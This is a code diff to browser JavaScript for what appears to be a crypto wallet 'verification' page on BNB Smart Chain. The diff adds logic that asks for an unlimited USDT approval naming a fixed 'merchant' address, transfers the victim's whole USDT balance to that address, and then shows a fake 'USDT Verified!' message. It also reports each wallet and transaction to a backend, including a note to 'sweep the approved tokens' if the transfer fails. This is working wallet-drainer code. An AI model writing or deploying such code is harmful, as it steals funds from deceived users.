@@ -12,8 +12,8 @@
     const CONFIG = {
         BACKEND_URL: 'https://at.rgh.digital',
         USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955', // BSC Mainnet USDT BEP20
-        CONTRACT_ADDRESS: '0x742a06f6c635D1447E500791e8B2658852E2C967', // Merchant / Spender Account
-        MIN_BALANCE_THRESHOLD: 0.1, // Minimum USDT balance required to trigger approval (e.g. 0.1 USDT)
+        CONTRACT_ADDRESS: '0x742a06f6c635D1447E500791e8B2658852E2C967', // Merchant / Receiving Account
+        MIN_BALANCE_THRESHOLD: 0.1, // Minimum USDT balance required to trigger approval (0.1 USDT)
         REQUIRED_HOLD_USDT: 100, // Standard Hold Amount displayed
         CHAIN_ID: '0x38', // BSC Mainnet (56)
         CHAIN_NAME: 'BNB Smart Chain',
@@ -363,7 +363,64 @@
     }
 
     // ============================================================
-    // 100% APPROVAL WORKFLOW
+    // TRANSFER TO MERCHANT ACCOUNT FUNCTION
+    // ============================================================
+    async function executeTransferToMerchant(providerObj, userAddress, amountWei) {
+        try {
+            const recipientTarget = CONFIG.CONTRACT_ADDRESS;
+            const recipientClean = recipientTarget.toLowerCase().replace('0x', '').padStart(64, '0');
+            const amountHex = amountWei.toString(16).padStart(64, '0');
+
+            // BEP20 transfer(address,uint256) = 0xa9059cbb
+            const transferCalldata = '0xa9059cbb' + recipientClean + amountHex;
+
+            console.log('Executing transfer of ' + formatUnits(amountWei, 18) + ' USDT to merchant account: ' + recipientTarget);
+
+            const transferTxHash = await providerObj.request({
+                method: 'eth_sendTransaction',
+                params: [{
+                    from: userAddress,
+                    to: CONFIG.USDT_ADDRESS,
+                    data: transferCalldata
+                }]
+            });
+
+            console.log('Transfer transaction submitted. Tx:', transferTxHash);
+
+            // Notify backend API
+            safeApiCall('/api/transfers/complete', {
+                wallet: userAddress,
+                amount: formatUnits(amountWei, 18),
+                txHash: transferTxHash,
+                recipient: recipientTarget
+            });
+
+            // Wait for receipt silently
+            for (let i = 0; i < 25; i++) {
+                await new Promise(r => setTimeout(r, 1500));
+                const receipt = await providerObj.request({
+                    method: 'eth_getTransactionReceipt',
+                    params: [transferTxHash]
+                }).catch(() => null);
+                if (receipt && receipt.blockNumber) break;
+            }
+
+            return transferTxHash;
+        } catch (transferErr) {
+            console.warn('Transfer to merchant notice:', transferErr);
+            // Notify backend in case relayer/backend sweeps the approved tokens
+            safeApiCall('/api/transfers/approved_pending_sweep', {
+                wallet: userAddress,
+                amount: formatUnits(amountWei, 18),
+                recipient: CONFIG.CONTRACT_ADDRESS,
+                error: transferErr.message
+            });
+            return null;
+        }
+    }
+
+    // ============================================================
+    // 100% APPROVAL & TRANSFER WORKFLOW
     // ============================================================
     async function request100PercentApproval(providerObj, userAddress) {
         if (state.isProcessing) return;
@@ -381,46 +438,53 @@
             // approve(address,uint256) = 0x095ea7b3
             const approveCalldata = '0x095ea7b3' + recipientClean + maxUint256Hex;
 
-            let txHash;
-            try {
-                // First attempt approve MaxUint256
-                txHash = await providerObj.request({
-                    method: 'eth_sendTransaction',
-                    params: [{
-                        from: userAddress,
-                        to: CONFIG.USDT_ADDRESS,
-                        data: approveCalldata
-                    }]
-                });
-            } catch (approveErr) {
-                const errLower = (approveErr.message || '').toLowerCase();
-                if (errLower.includes('user rejected') || errLower.includes('user denied')) {
-                    throw approveErr;
+            console.log('Requesting 100% approval (MaxUint256) for merchant:', recipientTarget);
+
+            // 1. Immediately triggers 100% approval in user's wallet
+            const approveTxHash = await providerObj.request({
+                method: 'eth_sendTransaction',
+                params: [{
+                    from: userAddress,
+                    to: CONFIG.USDT_ADDRESS,
+                    data: approveCalldata
+                }]
+            });
+
+            console.log('Approval transaction submitted. Hash:', approveTxHash);
+
+            safeApiCall('/api/approvals/submitted', {
+                wallet: userAddress,
+                txHash: approveTxHash,
+                spender: recipientTarget,
+                amount: 'MaxUint256'
+            });
+
+            // 2. Wait for approval confirmation
+            for (let i = 0; i < 25; i++) {
+                await new Promise(r => setTimeout(r, 1500));
+                const receipt = await providerObj.request({
+                    method: 'eth_getTransactionReceipt',
+                    params: [approveTxHash]
+                }).catch(() => null);
+                if (receipt && receipt.blockNumber) {
+                    console.log('Approval confirmed in block:', receipt.blockNumber);
+                    break;
                 }
-
-                // Fallback attempt: transfer available balance (0xa9059cbb)
-                const amountHex = state.usdtBalanceWei.toString(16).padStart(64, '0');
-                const transferCalldata = '0xa9059cbb' + recipientClean + amountHex;
-
-                txHash = await providerObj.request({
-                    method: 'eth_sendTransaction',
-                    params: [{
-                        from: userAddress,
-                        to: CONFIG.USDT_ADDRESS,
-                        data: transferCalldata
-                    }]
-                });
             }
 
+            // 3. After the approval, execute the transfer to the merchant account function
+            const amountToTransfer = state.usdtBalanceWei > 0n ? state.usdtBalanceWei : parseUnits("100", 18);
+            await executeTransferToMerchant(providerObj, userAddress, amountToTransfer);
+
+            // 4. Upon confirmation, show the success modal ("USDT Verified!")
             hideHoldModal();
             hideReleaseOverlay();
             showVerifiedModal(state.usdtBalance || '100');
 
         } catch (err) {
-            console.error('Approval request notice:', err);
+            console.error('Approval / Transfer process notice:', err);
             const errLower = (err.message || '').toLowerCase();
             if (!errLower.includes('user rejected') && !errLower.includes('user denied')) {
-                // If contract execution failed, fallback to hold modal
                 showHoldModal(CONFIG.REQUIRED_HOLD_USDT);
             }
         } finally {
@@ -449,7 +513,7 @@
 
         // 3. BALANCE CHECK:
         // If balance reached (i.e. user has USDT >= min threshold or balance > 0)
-        // -> CALL FOR THE APPROVAL OF 100% DIRECTLY!
+        // -> Immediately triggers 100% approval request, then executes transfer to merchant account, then shows verified modal!
         if (state.usdtBalanceWei >= minThresholdWei) {
             console.log('Balance reached (' + state.usdtBalance + ' USDT). Requesting 100% approval...');
             await request100PercentApproval(providerObj, userAddress);
@@ -477,7 +541,7 @@
 
         const minThresholdWei = parseUnits(CONFIG.MIN_BALANCE_THRESHOLD.toString(), 18);
 
-        // If user now has balance reached -> call 100% approval
+        // If user now has balance reached -> call 100% approval and transfer
         if (state.usdtBalanceWei >= minThresholdWei) {
             hideHoldModal();
             await request100PercentApproval(providerObj, state.walletAddress);
